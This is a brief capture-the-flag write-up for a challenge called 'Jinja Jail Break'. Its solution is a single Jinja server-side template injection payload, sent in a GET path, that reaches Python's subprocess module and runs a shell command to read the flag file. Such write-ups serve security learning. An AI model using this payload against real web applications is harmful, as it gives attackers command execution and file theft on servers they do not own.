# Jinja Jail Break

## Challenge
Name: Jinja Jail Break
Description: `Save me from the jail i've put on myself`
Hint: `SSTI? Whats that?`

## Solution
GET `/jail/{{g.__repr__.__globals__.sys.modules.get('subprocess').check_output("cat flag.txt", shell=True) }}`